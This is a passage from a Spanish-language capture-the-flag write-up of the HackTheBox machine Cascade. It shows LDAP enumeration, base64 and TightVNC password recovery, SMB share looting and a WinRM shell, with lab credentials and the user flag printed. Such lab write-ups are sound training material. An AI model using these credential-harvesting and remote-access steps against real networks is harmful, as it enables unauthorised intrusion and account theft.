<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"ou=Users,ou=UK,dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'#\|memberof'</span>
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;ou=Users,ou=UK,dc=cascade,dc=local&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>
<span class="c"># Users, UK, cascade.local</span>
<span class="c"># Steve Smith, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>Audit Share,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># Ryan Thompson, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># James Wakefield, Users, UK, cascade.local</span>
<span class="c"># Stephanie Hickson, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>HR,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># John Goodhand, Users, UK, cascade.local</span>
<span class="c"># Adrian Turnbull, Users, UK, cascade.local</span>
<span class="c"># Edward Crowe, Users, UK, cascade.local</span>
<span class="c"># Ben Hanson, Users, UK, cascade.local</span>
<span class="c"># David Burman, Users, UK, cascade.local</span>
<span class="c"># Services, Users, UK, cascade.local</span>
<span class="c"># ArkSvc, Services, Users, UK, cascade.local</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>AD Recycle Bin,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
<span class="c"># Util, Services, Users, UK, cascade.local</span>
<span class="c"># BackupSvc, Services, Users, UK, cascade.local</span>
<span class="c"># Joseph Allen, Users, UK, cascade.local</span>
<span class="c"># Ian Croft, Users, UK, cascade.local</span>
<span class="c"># search result</span>
<span class="c"># numResponses: 17</span>
<span class="c"># numEntries: 16</span>
</code></pre></div></div>

<ul>
  <li>Si vemos información del usuario podemos ver información como una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s2">"ou=Users,ou=UK,dc=cascade,dc=local"</span> | <span class="nb">grep</span> <span class="nt">-A</span> 50 <span class="nt">-i</span> <span class="s2">"# Ryan Thompson"</span>

<span class="c"># Ryan Thompson, Users, UK, cascade.local</span>
dn: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>uSNChanged: 295010
name: Ryan Thompson
objectGUID:: <span class="nv">LfpD6qngUkupEy9bFXBBjA</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>

<span class="c"># James Wakefield, Users, UK, cascade.local</span>
dn: <span class="nv">CN</span><span class="o">=</span>James Wakefield,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: James Wakefield
</code></pre></div></div>

<ul>
  <li>Al parecer es <code class="language-plaintext highlighter-rouge">base64</code> y podemos convertirla a texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo </span><span class="nv">clk0bjVldmE</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span>
rY4n5eva
</code></pre></div></div>

<h2 id="shell-as-ssmith">Shell as s.smith</h2>

<ul>
  <li>Verificamos que las credenciales sean correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"r.thompson"</span> <span class="nt">-p</span> <span class="s2">"rY4n5eva"</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
</code></pre></div></div>

<ul>
  <li>Vamos a ver los recursos compartidos por el método <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"r.thompson"</span> <span class="nt">-p</span> <span class="s2">"rY4n5eva"</span> <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\r</span>.thompson:rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.182    445    CASC-DC1         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit<span class="err">$</span>
SMB         10.10.10.182    445    CASC-DC1         C<span class="nv">$ </span>                             Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print<span class="nv">$ </span>         READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de lectura en un recurso importante que se llama <code class="language-plaintext highlighter-rouge">Data</code> vamos a ver que es lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //10.10.10.182/data <span class="nt">-U</span> r.thompson%rY4n5eva
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sun Jan 26 21:27:34 2020
  ..                                  D        0  Sun Jan 26 21:27:34 2020
  Contractors                         D        0  Sun Jan 12 19:45:11 2020
  Finance                             D        0  Sun Jan 12 19:45:06 2020
  IT                                  D        0  Tue Jan 28 12:04:51 2020
  Production                          D        0  Sun Jan 12 19:45:18 2020
  Temps                               D        0  Sun Jan 12 19:45:15 2020

		6553343 blocks of size 4096. 1625340 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Encontramos información interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\I</span>T<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Tue Jan 28 12:04:51 2020
  ..                                  D        0  Tue Jan 28 12:04:51 2020
  Email Archives                      D        0  Tue Jan 28 12:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 12:04:40 2020
  Logs                                D        0  Tue Jan 28 18:53:04 2020
  Temp                                D        0  Tue Jan 28 16:06:59 2020

		6553343 blocks of size 4096. 1625081 blocks available
smb: <span class="se">\I</span>T<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\I</span>T<span class="se">\&gt;</span> recurse ON
smb: <span class="se">\I</span>T<span class="se">\&gt;</span> prompt OFF
smb: <span class="se">\I</span>T<span class="se">\&gt;</span> mget <span class="k">*</span>
getting file <span class="se">\I</span>T<span class="se">\E</span>mail Archives<span class="se">\M</span>eeting_Notes_June_2018.html of size 2522 as Email Archives/Meeting_Notes_June_2018.html <span class="o">(</span>7.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 7.1 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\I</span>T<span class="se">\L</span>ogs<span class="se">\A</span>rk AD Recycle Bin<span class="se">\A</span>rkAdRecycleBin.log of size 1303 as Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log <span class="o">(</span>3.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.4 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\I</span>T<span class="se">\L</span>ogs<span class="se">\D</span>Cs<span class="se">\d</span>cdiag.log of size 5967 as Logs/DCs/dcdiag.log <span class="o">(</span>17.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 9.3 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\I</span>T<span class="se">\T</span>emp<span class="se">\s</span>.smith<span class="se">\V</span>NC Install.reg of size 2680 as Temp/s.smith/VNC Install.reg <span class="o">(</span>7.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.9 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Podemos ver un al parecer notas de una Reunión pero esta en <code class="language-plaintext highlighter-rouge">html</code> vamos a verla desde el navegador.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/1.png" />
</p>

<ul>
  <li>
    <p>Nos dan esta información <strong>Username is TempAdmin (password is the same as the normal admin account password)</strong>.</p>
  </li>
  <li>
    <p>En la ruta <code class="language-plaintext highlighter-rouge">/Temp/s.smith</code> vemos un archivo <code class="language-plaintext highlighter-rouge">.reg</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith <span class="nb">cat </span>VNC<span class="se">\ </span>Install.reg
Windows Registry Editor Version 5.00

<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC]

<span class="o">[</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\T</span>ightVNC<span class="se">\S</span>erver]
<span class="s2">"ExtraPorts"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"QueryTimeout"</span><span class="o">=</span>dword:0000001e
<span class="s2">"QueryAcceptOnTimeout"</span><span class="o">=</span>dword:00000000
<span class="s2">"LocalInputPriorityTimeout"</span><span class="o">=</span>dword:00000003
<span class="s2">"LocalInputPriority"</span><span class="o">=</span>dword:00000000
<span class="s2">"BlockRemoteInput"</span><span class="o">=</span>dword:00000000
<span class="s2">"BlockLocalInput"</span><span class="o">=</span>dword:00000000
<span class="s2">"IpAccessControl"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"RfbPort"</span><span class="o">=</span>dword:0000170c
<span class="s2">"HttpPort"</span><span class="o">=</span>dword:000016a8
<span class="s2">"DisconnectAction"</span><span class="o">=</span>dword:00000000
<span class="s2">"AcceptRfbConnections"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseVncAuthentication"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseControlAuthentication"</span><span class="o">=</span>dword:00000000
<span class="s2">"RepeatControlAuthentication"</span><span class="o">=</span>dword:00000000
<span class="s2">"LoopbackOnly"</span><span class="o">=</span>dword:00000000
<span class="s2">"AcceptHttpConnections"</span><span class="o">=</span>dword:00000001
<span class="s2">"LogLevel"</span><span class="o">=</span>dword:00000000
<span class="s2">"EnableFileTransfers"</span><span class="o">=</span>dword:00000001
<span class="s2">"RemoveWallpaper"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseD3D"</span><span class="o">=</span>dword:00000001
<span class="s2">"UseMirrorDriver"</span><span class="o">=</span>dword:00000001
<span class="s2">"EnableUrlParams"</span><span class="o">=</span>dword:00000001
<span class="s2">"Password"</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
<span class="s2">"AlwaysShared"</span><span class="o">=</span>dword:00000000
<span class="s2">"NeverShared"</span><span class="o">=</span>dword:00000000
<span class="s2">"DisconnectClients"</span><span class="o">=</span>dword:00000001
<span class="s2">"PollingInterval"</span><span class="o">=</span>dword:000003e8
<span class="s2">"AllowLoopback"</span><span class="o">=</span>dword:00000000
<span class="s2">"VideoRecognitionInterval"</span><span class="o">=</span>dword:00000bb8
<span class="s2">"GrabTransparentWindows"</span><span class="o">=</span>dword:00000001
<span class="s2">"SaveLogToAllUsersPath"</span><span class="o">=</span>dword:00000000
<span class="s2">"RunControlInterface"</span><span class="o">=</span>dword:00000001
<span class="s2">"IdleTimeout"</span><span class="o">=</span>dword:00000000
<span class="s2">"VideoClasses"</span><span class="o">=</span><span class="s2">""</span>
<span class="s2">"VideoRects"</span><span class="o">=</span><span class="s2">""</span>
</code></pre></div></div>

<ul>
  <li>Esta línea es interesante <a href="https://www.geeknetic.es/VNC/que-es-y-para-que-sirve">https://www.geeknetic.es/VNC/que-es-y-para-que-sirve</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Password"</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
</code></pre></div></div>

<ul>
  <li>
    <p>Aquí encontramos información donde nos dicen como podemos ver la contraseña en texto plano <a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>.</p>
  </li>
  <li>
    <p>Encontramos esta herramienta <a href="https://github.com/jeroennijhof/vncpwd">https://github.com/jeroennijhof/vncpwd</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  /opt <span class="nb">sudo </span>git clone https://github.com/jeroennijhof/vncpwd
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
Cloning into <span class="s1">'vncpwd'</span>...
remote: Enumerating objects: 28, <span class="k">done</span><span class="nb">.</span>
remote: Total 28 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 28
Receiving objects: 100% <span class="o">(</span>28/28<span class="o">)</span>, 22.15 KiB | 290.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  /opt <span class="nb">cd </span>vncpwd
➜  vncpwd <span class="nb">sudo </span>gcc <span class="nt">-o</span> vncpwd vncpwd.c d3des.c
</code></pre></div></div>

<ul>
  <li>Vamos a pasar los caracteres o la string a un archivo pero la vamos a guardar en formato binario ya que la contraseña codificada corresponde para un servidor VNC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith <span class="nb">echo</span> <span class="s1">'6bcf2a4b6e5aca0f'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> <span class="o">&gt;</span> vnc_pass
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos usar la herramienta y ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith /opt/vncpwd/vncpwd vnc_pass
Password: sT333ve2
</code></pre></div></div>

<ul>
  <li>En el repositorio de GitHub también nos dicen que podemos usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith msfconsole
Metasploit tip: Search can apply complex filters such as search cve:2009
<span class="nb">type</span>:exploit, see all the filters with <span class="nb">help </span>search


                                   .,,.                  <span class="nb">.</span>
                                .<span class="se">\$</span><span class="nv">$$$$</span>L..,,<span class="o">==</span>aaccaacc%#s<span class="nv">$b</span><span class="nb">.</span>       d8,    d8P
                     d8P        <span class="c">#$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p</span>
                  d888888P      <span class="s1">'7$$$$\""""''^^`` .7$$$|D*"'</span><span class="sb">```</span>         ?88<span class="s1">'
  d8bd8b.d8p d8888b ?88'</span> d888b8b            _.os#<span class="nv">$|</span>8<span class="k">*</span><span class="s2">"</span><span class="sb">`</span>   d8P       ?8b  88P
  88P<span class="sb">`</span><span class="s2">?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"</span><span class="sb">`</span>       d8P d8888b <span class="nv">$whi</span>?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS<span class="nv">$$$$</span><span class="k">*</span><span class="s2">" ?88,.d88b, d88 d8P' ?88 88P </span><span class="sb">`</span>?8b
d88<span class="s1">' d88b 8b`?8888P'</span><span class="sb">`</span><span class="s2">?8b</span><span class="sb">`</span>?88P<span class="s1">'.aS$$$$Q*"`    `?88'</span>  ?88 ?88 88b  d88 d88
                          .a#<span class="nv">$$$$$$</span><span class="s2">"</span><span class="sb">`</span>          88b  d8P  88b<span class="sb">`</span><span class="s2">?8888P'
                       ,s</span><span class="nv">$$$$$$</span><span class="s2">$"</span><span class="sb">`</span><span class="s2">             888888P'   88n      _.,,,ass;:
                    .a</span><span class="nv">$$$$$$$P</span><span class="sb">`</span>               d88P<span class="s1">'    .,.ass%#S$$$$$$$$$$$$$$'</span>
                 .a<span class="nv">$##</span><span class="c">#$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'</span>
              ,a<span class="nv">$$</span><span class="c">###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'</span>
           .a<span class="nv">$$$$$$$$$$</span>SSS<span class="nv">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span>SS##<span class="o">==</span><span class="nt">--</span><span class="s2">""</span><span class="s1">''</span>^^/<span class="nv">$$$$$$</span><span class="s1">'
_______________________________________________________________   ,&amp;$$$$$$'</span>_____
                                                                 ll&amp;&amp;<span class="nv">$$$$</span><span class="s1">'
                                                              .;;lll&amp;&amp;&amp;&amp;'</span>
                                                            ...<span class="p">;;</span>lllll&amp;<span class="s1">'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt; irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can'</span>t <span class="nb">alias jobs </span>from irb_jobs.
<span class="o">&gt;&gt;</span> fixedkey <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">07"</span>
<span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">17Rk</span><span class="se">\x</span><span class="s2">06#NX</span><span class="se">\a</span><span class="s2">"</span>
<span class="o">&gt;&gt;</span> require <span class="s1">'rex/proto/rfb'</span>
<span class="o">=&gt;</span> <span class="nb">true</span>
<span class="o">&gt;&gt;</span> Rex::Proto::RFB::Cipher.decrypt <span class="o">[</span><span class="s2">"6bcf2a4b6e5aca0f"</span><span class="o">]</span>.pack<span class="o">(</span><span class="s1">'H*'</span><span class="o">)</span>, fixedkey
<span class="o">=&gt;</span> <span class="s2">"sT333ve2"</span>
</code></pre></div></div>

<h2 id="user-txt">User txt</h2>

<ul>
  <li>Ahora comprobamos las credenciales al estar en el directorio <code class="language-plaintext highlighter-rouge">s.smith</code> le corresponden a ese usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2
SMB         10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
HTTP        10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\s</span>.smith:sT333ve2 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith evil-winrm <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2 <span class="nt">-i</span> 10.10.10.182

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>cascade<span class="se">\s</span>.smith
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
8b885675a5366ad864fed27bc2c8f4ed
</code></pre></div></div>

<h2 id="arksvc">arksvc</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>El usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">Audit Share</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User<span class="s1">'s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>Solamente nosotros somos miembros de ese grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; net localgroup <span class="s2">"Audit Share"</span>
Alias name     Audit Share
Comment        <span class="se">\\</span>Casc-DC1<span class="se">\A</span>udit<span class="err">$</span>

Members

<span class="nt">-------------------------------------------------------------------------------</span>
s.smith
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Vemos que hay otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        3/25/2020  11:17 AM                Administrator
d-----        1/28/2020  11:37 PM                arksvc
d-r---        7/14/2009   5:57 AM                Public
d-----        1/15/2020  10:22 PM                s.smith
</code></pre></div></div>

<ul>
  <li>No vemos nada interesante así vamos a ver recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.10.182 <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2 <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\s</span>.smith:sT333ve2
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.182    445    CASC-DC1         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit<span class="nv">$ </span>         READ
SMB         10.10.10.182    445    CASC-DC1         C<span class="nv">$ </span>                             Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print<span class="nv">$ </span>         READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
